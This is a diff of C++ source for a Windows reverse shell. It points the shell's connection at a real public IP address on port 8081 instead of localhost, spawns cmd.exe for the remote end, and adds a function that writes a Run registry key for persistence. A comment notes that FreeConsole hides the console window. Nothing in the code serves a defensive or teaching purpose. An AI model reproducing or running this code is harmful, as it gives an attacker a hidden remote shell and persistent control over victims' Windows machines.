@@ -2,17 +2,39 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
+#include <tchar.h>
+#include <string>
+#include <codecvt>
+#include <locale>
+#include <iostream>
+using namespace std;
+
+
 #pragma comment(lib, "Ws2_32.lib")
 #define DEFAULT_BUFLEN 1024
-
+#define BUFSIZE MAX_PATH
 void BindSock(char* rhost, int rport);
 
 int main(int argc, char** argv) {
 	//FreeConsole(); // This is the way to make the cmd vanish
-	char rhost[] = "127.0.0.1"; // ip to connect to
+	char rhost[] = "51.75.30.35"; // ip to connect to
 	int rport = 8081;
-	BindSock(rhost, rport);
-	return 0;
+	
+	TCHAR Buffer[BUFSIZE];
+	DWORD dwRet;
+
+	dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
+	cout<< (char*)Buffer;
+	//BindSock(rhost, rport);
+	return 0;	
+}
+
+
+void CreateKey() {
+	std::wstring progPath = L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";
+	HKEY hkey = NULL;
+	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
+	LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
 }
 void BindSock(char* rhost, int rport) {
 	/*while (1) {*/
@@ -69,7 +91,7 @@ void BindSock(char* rhost, int rport) {
 	printf("[*] Created process props\n");
 
 	CHAR commandLine[255];
-	strcpy_s(commandLine, "cmd.exe");
+	strcpy_s(commandLine,255,"cmd.exe");
 
 	CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 	WaitForSingleObject(pi.hProcess, INFINITE);
